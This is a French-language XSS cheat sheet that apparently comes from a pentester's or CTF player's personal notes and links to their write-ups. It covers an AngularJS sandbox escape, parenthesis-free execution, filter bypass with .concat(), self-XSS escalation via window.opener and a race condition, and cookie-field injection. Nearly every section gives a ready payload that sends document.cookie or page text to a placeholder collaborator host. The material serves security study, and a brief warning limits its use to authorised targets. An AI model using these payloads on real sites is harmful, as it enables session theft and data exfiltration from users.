---
titre: "XSS — Techniques avancées"
tags: [XSS, DOM, CSTI, bypass, cheatsheet, index]
---

# XSS — Techniques avancées

> Fiche de synthèse **alimentée par mes write-ups**. Théorie de base :
> [[11 - XSS]] et [[XSS]]. Contournements WAF : [[XSS — Bypass & Filter Evasion (WAF, Sanitizers)]].
> Payloads bruts : [[XSS - Payloads]] · outil de fuzzing : [[XSS Finder]].
>
> ⚠️ À n'exécuter que sur des cibles explicitement autorisées (cf. `README`).

---

## 1. CSTI / Template injection côté client (AngularJS)

Quand l'entrée est rendue dans un contexte de template AngularJS, on évade le
sandbox via `constructor.constructor` pour exécuter du JS arbitraire :
```javascript
{{constructor.constructor("window.location.href='https://COLLAB/?c='+btoa(document.body.innerText)")()}}
```
Write-up : [[DOM Based - AngularJS]].

---

## 2. Exécuter du JS sans parenthèses `()`

Utile quand `(` et `)` sont filtrés.

### Tagged templates (backticks)
```javascript
alert`1`
setTimeout`eval\x28atob\x28\x22<base64>\x22\x29\x29`   // \x28=( \x29=)
```

### Opérateur virgule / court-circuit
```javascript
1+1,alert`1`
1+1 && atob`ZG9jdW1lbnQ...`      // exécute le résultat décodé
1*1==1 ? document.location='//COLLAB/?c='+document.cookie : 3
```
Write-up : [[DOM Based - Eval]] (contexte `eval`, vol de cookie).

---

## 3. Contourner un filtre de mots-clés par `.concat()`

Fractionner les chaînes sensibles (`http`, `location`) pour échapper à la
détection par pattern :
```javascript
' || (eval)(document.location='ht'.concat('tps://COLLAB/?c='.concat(document.cookie))) //
' || (location='//COLLAB/?c='.concat(document.cookie)) //
```
Le `' ||` ferme la chaîne et enchaîne l'expression ; `//` commente la fin.
Write-up : [[DOM Based Filter Bypass]].

---

## 4. Self-XSS → XSS exploitable

Quand la XSS ne touche que **sa propre** session, il faut la faire exécuter dans
le contexte de la **victime**.

### Via `window.opener` (relation parent/enfant)
Page A ouvre Page B avec `open()` ; B accède à A via `opener.document`. On
exfiltre le contenu de la page privée de la victime :
```javascript
const page2 = window.open(location.href, "page2");
// dans la fenêtre enfant :
`<img src=x onerror="location='${webhook}/?res='+btoa(unescape(encodeURIComponent(opener.document.body.innerText)))">`
```
Write-up : [[Self XSS - DOM Secrets]].

### Via race condition (quand `opener`/iframe sont bloqués)
Contre `Cross-Origin-Opener-Policy: same-origin` + `X-Frame-Options: deny` :
on exploite une fenêtre temporelle entre deux requêtes (`GET /profile` rendu
serveur avec le secret admin, `GET /api/me` rendu client avec notre username XSS)
en **échangeant le cookie entre les deux**.

Astuces clés :
- **serveur single-threaded** (Werkzeug) saturé par un POST de ~3 Mo de padding
  pour ordonnancer les requêtes ;
- **`enctype="text/plain"`** pour forger un corps JSON valide via un formulaire
  HTML classique (bypass du `Content-Type: application/json` attendu).

Write-up complet et timeline : [[Self XSS - Race Condition]].

---

## 5. Injection via un canal détourné (cookie)

Quand titre/message sont sanitisés mais qu'un champ **cookie** (`status`) est
reflété sans filtrage :
```html
admin"><script>document.location='https://COLLAB/?c='+document.cookie</script>
```
Modifier le cookie via Caido/DevTools (Application → Cookies). Write-up : [[XSS stocke 2]].

---

## Aide-mémoire — quel payload pour quel contexte ?

| Contexte / blocage | Technique | Write-up |
|---|---|---|
| Template AngularJS | `{{constructor.constructor(...)()}}` | [[DOM Based - AngularJS]] |
| `()` filtrées | backticks `alert\`1\``, virgule | [[DOM Based - Eval]] |
| Mots-clés filtrés | `.concat()`, `' \|\|`  | [[DOM Based Filter Bypass]] |
| XSS limitée à ma session | `window.opener` | [[Self XSS - DOM Secrets]] |
| `COOP` + `X-Frame-Options` | race condition + `enctype=text/plain` | [[Self XSS - Race Condition]] |
| Champs HTML sanitisés | injection via cookie | [[XSS stocke 2]] |
| WAF / sanitizer générique | voir la fiche dédiée | [[XSS — Bypass & Filter Evasion (WAF, Sanitizers)]] |
